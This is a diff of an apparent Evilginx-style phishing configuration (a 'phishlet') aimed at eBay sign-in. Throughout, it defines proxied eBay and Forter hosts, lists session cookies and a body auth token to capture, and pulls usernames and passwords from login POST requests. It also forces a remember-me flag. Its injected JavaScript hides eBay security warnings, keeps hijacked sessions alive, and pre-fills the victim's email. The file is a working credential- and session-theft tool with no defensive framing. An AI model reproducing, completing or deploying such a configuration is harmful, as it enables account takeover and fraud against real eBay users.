@@ -1,270 +1,92 @@
----
+#hosturi
 name: ebay
-author: Anon0369G
-min_ver: 3.0.0
+author: Anon369G
+version: v3.0.0
 proxy_hosts:
-  - phish_sub: www
-    orig_sub: www
-    domain: ebay.com
-    session: true
-    is_landing: true
-  - phish_sub: signin
-    orig_sub: signin
-    domain: ebay.com
-    session: true
-  - phish_sub: pay
-    orig_sub: pay
-    domain: ebay.com
-    session: true
-  - phish_sub: my
-    orig_sub: my
-    domain: ebay.com
-    session: true
+  - {phish_sub: '', orig_sub: 'www', domain: 'ebay.com', session: true, is_landing: true}
+  - {phish_sub: 'signin', orig_sub: 'signin', domain: 'ebay.com', session: true, is_landing: false}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'ebay.com', session: false, is_landing: false}
+  - {phish_sub: 'accountsettings', orig_sub: 'accountsettings', domain: 'ebay.com', session: false, is_landing: false}
+  - {phish_sub: 'devicebind', orig_sub: 'devicebind', domain: 'ebay.com', session: false, is_landing: false}
+  - {phish_sub: 'cdn3', orig_sub: 'cdn3', domain: 'forter.com', session: false, is_landing: false}
+#filtre
 sub_filters:
-  - triggers_on: www.ebay.com
-    orig_sub: www
-    domain: ebay.com
-    search: https://{hostname}/
-    replace: https://{hostname}
-    mimes:
-      - text/html
-      - application/json
-      - application/javascript
-  - triggers_on: www.ebay.com
-    orig_sub: www
-    domain: ebay.com
-    search: https://{hostname}/
-    replace: https://{hostname}/
-    mimes:
-      - text/html
-      - application/json
-      - application/javascript
-  - triggers_on: signin.ebay.com
-    orig_sub: signin
-    domain: ebay.com
-    search: https://signin.{hostname}/
-    replace: https://signin.{hostname}/
-    mimes:
-      - text/html
-      - application/json
-      - application/javascript
-  - triggers_on: signin.ebay.com
-    orig_sub: signin
-    domain: ebay.com
-    search: https://auth.{hostname}/
-    replace: https://signin.{hostname}/
-    mimes:
-      - text/html
-      - application/json
-      - application/javascript
-  - triggers_on: pay.ebay.com
-    orig_sub: pay
-    domain: ebay.com
-    search: https://pay.{hostname}/
-    replace: https://pay.{hostname}/
-    mimes:
-      - text/html
-      - application/json
-      - application/javascript
-  - triggers_on: my.ebay.com
-    orig_sub: my
-    domain: ebay.com
-    search: https://my.{hostname}/
-    replace: https://my.{hostname}/
-    mimes:
-      - text/html
-      - application/json
-      - application/javascript
-  - triggers_on: my.ebay.com
-    orig_sub: account
-    domain: ebay.com
-    search: https://account.{hostname}/
-    replace: https://my.{hostname}/
-    mimes:
-      - text/html
-      - application/json
-      - application/javascript
-  - triggers_on: www.ebay.com
-    orig_sub: www
-    domain: ebay.com
-    search: https://{hostname}/logout
-    replace: https://{hostname}/logout
-    mimes:
-      - text/html
-      - application/json
-      - application/javascript
-  - triggers_on: signin.ebay.com
-    orig_sub: signin
-    domain: ebay.com
-    search: https://signin.{hostname}/logout
-    replace: https://signin.{hostname}/logout
-    mimes:
-      - text/html
-      - application/json
-      - application/javascript
-  - triggers_on: www.ebay.com
-    orig_sub: www
-    domain: ebay.com
-    search: '"https://{hostname}/'
-    replace: '"https://{hostname}/'
-    mimes:
-      - text/html
-      - application/json
-      - application/javascript
-  - triggers_on: www.ebay.com
-    orig_sub: www
-    domain: ebay.com
-    search: "'https://{hostname}/"
-    replace: "'https://{hostname}/"
-    mimes:
-      - text/html
-      - application/json
-      - application/javascript
-  - triggers_on: www.ebay.com
-    orig_sub: www
-    domain: ebay.com
-    search: "@{hostname}"
-    replace: "@{hostname}"
-    mimes:
-      - text/html
-      - application/json
-      - application/javascript
+  - {triggers_on: 'www.ebay.com', orig_sub: 'www', domain: 'ebay.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/signin', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.ebay.com', orig_sub: 'www', domain: 'ebay.com', search: 'https://{hostname}/gh/collectbehaviorinfo', replace: 'https://{hostname}/gh/collectbehaviorinfo', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'signin.ebay.com', orig_sub: 'signin', domain: 'ebay.com', search: 'https://{hostname}/signin/srv', replace: 'https://{hostname}/signin/srv', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'signin.ebay.com', orig_sub: 'signin', domain: 'ebay.com', search: 'https://{hostname}/signin/srv/identifer', replace: 'https://{hostname}/signin/srv/identifer', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.ebay.com', orig_sub: 'accounts', domain: 'ebay.com', search: 'https://{hostname}/acctxs/hub', replace: 'https://{hostname}/acctxs/hub', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accountsettings.ebay.com', orig_sub: 'accountsettings', domain: 'ebay.com', search: 'https://{hostname}/uas', replace: 'https://{hostname}/uas', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'cdn3.forter.com', orig_sub: 'cdn3', domain: 'forter.com', search: 'https://{hostname}/events', replace: 'https://{hostname}/events', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'devicebind.ebay.com', orig_sub: 'devicebind', domain: 'ebay.com', search: 'https://{hostname}/signin/sub/log', replace: 'https://{hostname}/signin/sub/log', mimes: ['text/html', 'application/json', 'application/javascript']}
+#cookies
 auth_tokens:
-  - domain: .ebay.com
-    keys:
-      - s
-      - dp1
-      - npii
-      - ebay
-      - ebay_token
-    type: cookie
-    session_keys:
-      - s
-      - dp1
-auth_urls:
-  - https://signin.ebay.com/ws/eBayISAPI.dll?SignIn
-  - https://www.ebay.com/signin
-  - https://www.ebay.com/myb/SignIn
-  - https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&signInAction=login
-  - https://www.ebay.com/verify
-urls:
-  login: https://signin.ebay.com/ws/eBayISAPI.dll?SignIn
-  logout: https://www.ebay.com/logout
-  MFA: https://www.ebay.com/mfa
-  password_reset: https://www.ebay.com/password-reset
-  account_recovery: https://www.ebay.com/account-recovery
-force_post:
-  - domain: 'signin.ebay.com'
-    path: '/ws/eBayISAPI.dll?SignIn'
-    type: post
-    force:
-      - key: 'userid'
-        search: '.*'
-        replace: '{{credentials.username}}'
-        value: '{{credentials.username}}'
-      - key: 'pass'
-        search: '.*'
-        replace: '{{credentials.password}}'
-        value: '{{credentials.password}}'
-
+  - domain: '.ebay.com'
+    keys: ['cid', 's', 'ds1', 'ds2', 'ebay', 'dp1', 'nonsession', 'ns1', '__uzma', '__uzmb', '__uzme']
+    type: 'cookie'
+  - domain: 'ebay.com'
+    path: '/signin'
+    name: 'auth_token'
+    search: '"auth_token":"([^"]*)"'
+    type: 'body'
+#conturile
 credentials:
   username:
-    key: 'userid'         # The name of the email/username field on eBay login
-    type: 'email'          # Field type for email
-    required: true
-    search: 'userid'
+    key: 'userid'
+    search: '(.*)'
+    type: 'post'
   password:
-    key: 'pass'           # The name of the password field on eBay login
-    type: 'password'       # Field type for password
-    required: true
-    search: 'pass'
-    
+    key: 'pass'
+    search: '(.*)'
+    type: 'post'
+
+auth_urls:
+  - url: 'https://signin.ebay.com/'
+    type: 'GET' # URL for the page where the username/email is entered
+    form_action: '/signin/id' # Action URL to submit the username form
+  - url: 'https://signin.ebay.com/signin/s' 
+    type: 'POST' # URL for the page where the password is entered
+    form_action: '/signin/s' # Action URL to submit the password form
+
 login:
-  domain: 'signin.ebay.com'  # The target domain for the login form
-  path: '/ws/eBayISAPI.dll?SignIn'  # Path for login form submission
-  method: 'POST'  # HTTP method for form submission
-  form:
-    fields:
-      - { name: 'userid', required: true }    # Username field
-      - { name: 'pass', required: true }      # Password field
-rules:
-  # Rule 1: Handle login page JavaScript injection
-  - triggers:
-      - domain: ebay.com
-        path: /signin
-    action: inject
-    inject_js:
-      code: |
-        (function() {
-          console.log("Custom JS for eBay login page");
-          // Hiding any potential security alerts on login
-          const securityAlerts = document.querySelectorAll('.security-alert, .login-warning');
-          securityAlerts.forEach(el => el.style.display = 'none');
-          
-          // Optional: Log submission event for debugging
-          const loginForm = document.querySelector('form');
-          if (loginForm) {
-            loginForm.addEventListener('submit', () => {
-              console.log("Login form submitted.");
-            });
-          }
-        })();
+  - url: 'https://signin.ebay.com/' # First step: Email input page
+    method: 'POST'
+    data:
+      - key: 'userid'       # The username/email key from the first page
+        value: '{username}'  # This will be replaced with the username/email provided
+      - key: 'pass'         # In the case of the second page (password), leave it empty for now
+        value: ''            # Empty at this stage, as we only submit the email in the first step
+    action: '/signin' # Action to submit the email
 
-  # Rule 2: Handle MFA page injection
-  - triggers:
-      - domain: ebay.com
-        path: /mfa
-        cookie:
-          contains: dp1    # Check if the user's session has dp1 cookie (used by eBay for session management)
-    action: inject
-    inject_js:
-      code: |
-        (function() {
-          console.log("Handling eBay MFA page");
-          // Code to handle MFA prompts if needed.
-          // Optional: Automatically advance if certain elements are present
-          const mfaPrompt = document.querySelector('.mfa-prompt');
-          if (mfaPrompt) {
-            console.log("MFA prompt detected. Ensure user interaction.");
-          }
-        })();
+  - url: 'https://signin.ebay.com/signin/s' # Second step: Password input page
+    method: 'POST'
+    data:
+      - key: 'pass'          # The password key from the second page
+        value: '{password}'  # This will be replaced with the password provided by the user
+    action: '/signin/s'
 
-  # Rule 3: Handle re-authentication page (if user is redirected to it)
-  - triggers:
-      - domain: ebay.com
-        path: /reauth
-        cookie:
-          contains: ebay_token  # Session-based token for eBay re-authentication check
-    action: inject
-    inject_js:
-      code: |
-        (function() {
-          console.log("Handling eBay re-authentication for session continuity");
-          // Additional JavaScript for handling the re-authentication flow if needed.
-        })();
+force_post:
+  - path: '/signin/s'  # Path for the password submission
+    search:
+      - {key: 'userid', search: '.*'}  # Match the username (email) input
+      - {key: 'pass', search: '.*'}    # Match the password input
+    force:
+      - {key: 'kmsi', value: '1'}  # Force the "Remember Me" parameter
+    type: 'post'
 
-  # Rule 4: Redirect to login page upon logout
-  - triggers:
-      - domain: ebay.com
-        path: /logout
-    action: redirect
-    redirect_to: https://www.ebay.com/signin
-
-  # Rule 5: Redirect error pages to the main login page for a seamless experience
-  - triggers:
-      - domain: ebay.com
-        path: /n/error     # This is commonly used for handling error redirects.
-    action: redirect
-    redirect_to: https://www.ebay.com/signin
 js_inject:
-- trigger_domains: ["signin.ebay.com", "www.ebay.com", "pay.ebay.com", "my.ebay.com"]
-  trigger_paths: ["/signin", "/myb/SignIn", "/mfa", "/auth"]
-  script: >
-    (function() {
-        const elementsToHide = document.querySelectorAll('.security-warning, .login-notice');
-        elementsToHide.forEach(element => element.style.display = 'none');
-
-        setInterval(() => {
-            fetch(window.location.href, { method: 'GET', credentials: 'include' });
-        }, 40000);
-    })();
+  - trigger_domains: ['www.ebay.com']
+    trigger_paths: ['/signin/srv/identifier', '/signin/s']
+    trigger_params: ['userid', 'pass']
+    script: |
+      function setCredentials() {
+        var emailField = document.querySelector("#userid");
+        var passwordField = document.querySelector("#pass");
+        if (emailField != null && passwordField != null) {
+          emailField.value = "{email}";
+          passwordField.focus();
+          return;
+        }
+        setTimeout(function() { setCredentials(); }, 100);
+      }
+      setTimeout(function() { setCredentials(); }, 100);
